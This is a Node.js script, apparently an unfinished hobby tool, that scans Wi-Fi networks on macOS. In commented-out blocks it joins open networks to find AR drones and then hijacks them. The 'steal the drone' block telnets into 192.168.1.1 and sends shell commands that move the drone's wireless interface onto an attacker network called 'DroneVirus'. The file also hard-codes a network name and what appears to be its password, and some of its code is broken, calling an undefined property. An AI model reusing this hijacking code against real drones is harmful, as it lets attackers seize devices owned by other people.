var EventEmitter = require('events').EventEmitter
  , exec = require('child_process').exec
  , util = require('util')
  , airport = require( 'airport-wrapper' )
  , net = require('net');

var airportBinary = "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport"
  , async = require('async');

function Network(opts) {
  opts || (opts = {});
  this.connected = false;
  this.networks = [];
  this.interface = opts.interface || "en1";
  this.scanner = null;

  EventEmitter.call(this);
}

util.inherits(Network, EventEmitter);

Network.prototype.scan = function scan(cb) {
  var self = this;
  cb = cb || function() { };

  exec(self.airport + " --scan", function(err, stdout, stderr) {
    console.log(stdout);
    var networks = stdout.split('\n');

    console.log(networks.length);

    networks.forEach(function(network) {
      var parts = network.trim().split(" ")
        , obj;

      obj = {
        ssid: parts[0],
        bssid: parts[1],
        rssi: parts[2],
        channel: parts[3],
        ht: parts[4],
        cc: parts[5],
        security: parts[6]
      };

      self.networks.push(obj);
    });

    cb(null, self.networks);
  });
};

var network = new Network();
network.scan(console.log)

/*
function findNetworks(cb) {
  var foundNetworks = [];

  exec(airportBinary + " --scan", function(err, stdout, stderr) {
    var networks = stdout.split('\n');

    networks.forEach(function(network) {
      var parts = network.trim().split(" ");
      if(parts[parts.length - 1] == "NONE") {
        foundNetworks.push(parts[0]);
        console.log("Adding Network: " + parts[0]);
      }
    });
    console.log("Done adding networks");
    cb(foundNetworks);
  });
}

findNetworks(function(networks) {
  var drones = [];
  networks = ["Maggie"];
  async.filterSeries(networks, function isDrone(network, cb) {
    console.log("Connecting to " + network);
    exec("networksetup -setairportnetwork en1 " + "WCAir educate1", function(err, stdout, stderr) {
      setTimeout(function() {
        var arDrone = require('ar-drone')
          , client = arDrone.createClient();
        console.log("connected to " + network);
        console.log(client.battery());

        if(client.battery() != 100) {
          console.log(network + " is a drone");
          cb(true);
        } else {
          console.log(network + " isn't a drone");
          cb(false);
        }
      }, 10000);
    });
  }, stealDrones);
});

function stealDrones(results) {
  console.log(results);
}
*/


/*steal the drone
var ipnum = 99;
var client = net.connect({port: 23, host: "192.168.1.1"},
function() {
    console.log('client connected');
    client.write('ifconfig ath0 down ; iwconfig ath0 mode managed essid DroneVirus ap any channel auto commit ; ifconfig ath0 192.168.43.'+ipnum+' netmask 255.255.255.0 up\r\n');
  client.end();
});
*/
